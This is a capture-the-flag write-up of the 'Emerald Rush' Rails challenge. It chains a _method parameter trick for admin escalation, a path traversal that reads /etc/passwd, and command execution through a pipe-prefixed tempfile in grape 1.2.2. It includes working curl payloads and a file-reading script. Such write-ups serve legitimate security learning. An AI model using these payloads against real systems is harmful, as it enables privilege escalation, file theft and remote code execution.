# Emerald Rush

## Recon

There is a link to [a gitlab repo](https://gitlab.com/GitterLaburin/filesh4r3r) hidden inside a comment. This give us the source code of the challenge. (Secrets not included)

```
<!-- POWERED BY https://gitlab.com/GitterLaburin/filesh4r3r -->
```

## User service

The application uses JSON Web Tokens (JWT) to keep track of the user's identity.
It also contains whether the user is admin or not (`is_admin`)

```
$ cut -f2 -d. | base64 -d | jq 
{
  "user_id": 151,
  "is_admin": false,
  "exp": 1575321382
}
```

It is possible to change the current user's password. The code handling this is located in `UsersController`.

```
class UsersController < ApplicationController
  def index
    # [1]
    req_params = params
    if request.post?
      req_params = user_update_params  
    end
    req_params['id'] = @current_user['user_id']
    # [3]
    Net::HTTP.start(Rails.application.secrets.auth_api_addr, Rails.application.secrets.auth_api_port) { |http|
      res = http.send_request(request.method, '/user', req_params.as_json.to_query)
 
 # [...]

  # [2]
  def user_update_params
    params.permit(:username, :password)
  end
```

The endpoint is mapped for both GET and POST methods.
The code works the following way:
1. If the request is a POST request, sanitize the request
2. `req_params` becomes `params` filtered with only `username` and `password`
3. `req_params` is forwarded to the authentication backend. 


If the `request.post?` check was not present, it would be possible to fill `req_params` with anything, in particular with `is_admin`, which would effectively set the current user administrator.

It is possible to make `request.post` be false even though the request is a `POST` request using Rails's magic `_method` parameter.
The source for parameter can be found [on Ruby on Rails's documentation](https://api.rubyonrails.org/classes/ActionDispatch/Request.html#method-i-request_method)



```
$ curl 'http://web-emeraldrush.ctfz.one/user' \
    -H "Cookie: session=$SESSION" \
    --data-urlencode 'username=tfns' \
    --data-urlencode 'password=H1gh.Qu4lity.St3gan0gr4ph3rz' \
    --data-urlencode 'is_admin=true' \
    --data-urlencode '_method=GET'


[...]
  <h1>Profile</h1>
    <p class="username"><strong>Username: </strong> tfns </p>
    <p class="user-id"><strong>UserID: </strong> 151</p>
      <p class="role"><strong>Role: </strong> Admin </p>
[...]
```

After a quick logout/login:

![](https://i.imgur.com/JmmNoLG.png)

## File Service

Once we are admin we are allowed to use the Files section.

![](https://i.imgur.com/KTXGpLc.png)

He we can upload and retreive files.

After **a lot** of guessing we discovered a weird behavior.

If we upload a file named `owned` we can retreive it by going on the link `http://web-emeraldrush.ctfz.one/files?filename=owned`

But if we go to `http://web-emeraldrush.ctfz.one/files?filename=owne/d` with a `/` in the middle of the name the server returns an error 500. This behavior is present only if a file with the name `owned` exists.

So we tried to create a file file named `....................etcpasswd`.
And retreving it with `http://web-emeraldrush.ctfz.one/files?filename=../../../../../../../../../../etc/passwd`

And we got

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

![](https://www.reactiongifs.com/r/mgc.gif)



A script was used to retrieve files rapidly from the remote server. See `read.sh` in the appendices.


### Exploration of the backend

1. Retrieve Dockerfile
2. Retrieve parts of the app
3. Retrieve Gemfile
4. Retrieve grape api router (api.rb)
5. Retrieve acme/ directory

### Analysis of the API

The API consists of 3 files: `download.rb`, `list.rb` and `upload.rb`.
The user's `user_id` is passed to all of them. It is interpreted as an integer. It is not possible to alter it.

The `Dockerfile` found at the server's root contains the following statement:
```
RUN mv /myapp/flag /run_me_to_get_fl@g && chmod 111 /run_me_to_get_fl@g
```

This means the end goal of this task is to get code execution on the server to obtain the flag.

In ruby if the  name of the file you want to open starts with a pipe, it will be executed as a shell command and the output will be the content of the file.
For example if you do `File.read('|id')` you will get the output of the command `id`.

So we looked for reference to file opening.

`upload.rb` uses the following construct: `File.read(attrs[:file][:tempfile])`.


The Gemfile specifically pins a version of the `grape` gem. This version, the 1.2.2 is outdated and vulnerable.

Among the published vulnerabilities, one caught our attention:

[ File type validator not checking the type of :tempfile #1841](https://github.com/ruby-grape/grape/issues/1841#issue-390113934)

And its [corresponding patch](https://github.com/ruby-grape/grape/pull/1844/files)

This means that it is possible to leverage the vulnerability mentionned above to read an arbitrary file on the remote server with `File.read()`.

Using both this *feature* and the vulnerability, it is possible to execute arbitrary commands on the backend server.

```
curl 'http://web-emeraldrush.ctfz.one/files' \
    -H "Cookie: $COOKIE" \
    -F 'file[filename]=owned' \
    -F 'file[tempfile]=|/run_me_to_get_fl@g>/tmp/ikoLx9oR90'

./read.sh /tmp/ikoLx9oR90
ctfzone{c@ll_tH3_1nf0s3c_p0l1c3_th3y_@r3_h0ld1ng_m3_c@pt1v3_@nd_m@k3_m3_c0de_0n_ruby}
```

**Flag**: `ctfzone{c@ll_tH3_1nf0s3c_p0l1c3_th3y_@r3_h0ld1ng_m3_c@pt1v3_@nd_m@k3_m3_c0de_0n_ruby}`




## Appendices

### read.sh
```
#!/bin/sh
COOKIE="session=eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjoxNTEsImlzX2FkbWluIjp0cnVlLCJleHAiOjE1NzUzMjIyMTN9.HlbfEmoaheXlI3H6_qIMk-dCjN1nAUP4NxKKAEkCht0iyS4b2MDS-pVS5jxSRaQ4DSh04hIxQDveb1QhwBjCsQFBOLQpMeabDs45wHHE8FckfkM5JBypdcj2IjaWJ9y_inDHPQCUOwV2Ap3oTzkCYy7QSk1CUWf6VIQrkw5yQE7RuzLXvBfDq4wtcgm4hfBhR83D18bt05o7rWv5ux6xoZmG4EGzCvTZlE0pLHpIe3XIWNC5o-Z2gYw1BryOfQ2rejUxkjTYi72_jsB5BIaMIqdLlwyQjt_ft62mp14RhvY99usLXOX7KTVghFEyUAtONCT_NOoJAIWDX8PAzJIklw"
FILENAME=$1
FILENAME_CLEAN=$(echo $FILENAME | tr -d '/')

curl -s 'http://web-emeraldrush.ctfz.one/files' -H "Cookie: $COOKIE" \
	-F "file=@/dev/null;filename=$FILENAME_CLEAN" > /dev/null

curl -G 'http://web-emeraldrush.ctfz.one/files' -H "Cookie: $COOKIE" \
	--data-urlencode "filename=$FILENAME" --output -
```


### Gemfile
```
source 'https://rubygems.org'

ruby '2.5.7'

gem 'grape', '1.2.2'
gem 'puma'
gem 'rails'
gem 'pg'
```

### acme/download.rb
```
module Acme
  class Download < Grape::API
    resource 'download/:user_id/:file_name' do

      params do
        requires :user_id, type: Integer
        requires :file_name, type: String, coerce_with: Base64.method(:decode64)
      end

      get  do
        if File.exist?(Rails.root.join("uploads", params[:user_id].to_s, params[:file_name].to_s.tr('/','')))
        content_type "application/octet-stream"
        header['Content-Disposition'] = "attachment; filename=" + params[:file_name]
        env['api.format'] = :binary
        File.open(Rails.root.join("uploads", params[:user_id].to_s, params[:file_name].to_s)).read
       else
        status 404
        { :status => 'bad request', :message => "file not found" }
      end
      end

    end
  end
end
```

### acme/list.rb
```
module Acme
  class List < Grape::API
    resource 'list/:user_id' do

      params do
        requires :user_id, type: Integer
      end

      get  do
        if Dir.exist?(Rails.root.join('uploads',params[:user_id].to_s))
          file_list = Dir.entries(Rails.root.join('uploads', params[:user_id].to_s)).select {|f| !File.directory? f}
          if file_list.any?
            {:status => "ok", :files => file_list}
          else
            status 404
            {:status => "Not Found", :files => []}
          end
        else
          {:status => "No Files", :files => []}
      end
    end
  end
  end
end
```

### acme/upload.rb
```
module Acme
  class Upload < Grape::API
    helpers do
      def commit_params(attrs)
        {
            file_name: attrs[:file][:filename],
            file_content: File.read(attrs[:file][:tempfile])
        }
      end

      def declared_params(options = {})
        options = {include_parent_namespaces: true }.merge(options)
        declared(params, options).to_h.symbolize_keys
      end
    end


    resource 'upload/:user_id' do
      params do
        requires :user_id, type: Integer
        requires :file, type: File
      end

      post do
        options = {'include_missing': false}
        options = {include_parent_namespaces: false}.merge(options)
       # a =  commit_params(declared_params(include_missing: false))
        args = declared(params, options).to_h.symbolize_keys
        Dir.mkdir(Rails.root.join('uploads',args[:user_id].to_s)) unless Dir.exist?(Rails.root.join('uploads',args[:user_id].to_s))
        uploaded_file = File.read(args[:file][:tempfile])
        unless args[:file][:filename].to_s.strip.empty? and File.exist?(Rails.root.join('uploads',args[:user_id], args[:file][:file_name]))
          File.open(Rails.root.join('uploads', args[:user_id].to_s , args[:file][:filename]), 'wb') do |file|
            file.write(uploaded_file)
            { :status => "ok", :message => "created" }
          end
        else
          status 400
          {:status => 'bad request', :message => "please try again"}
        end
      end
    end
  end
end
```
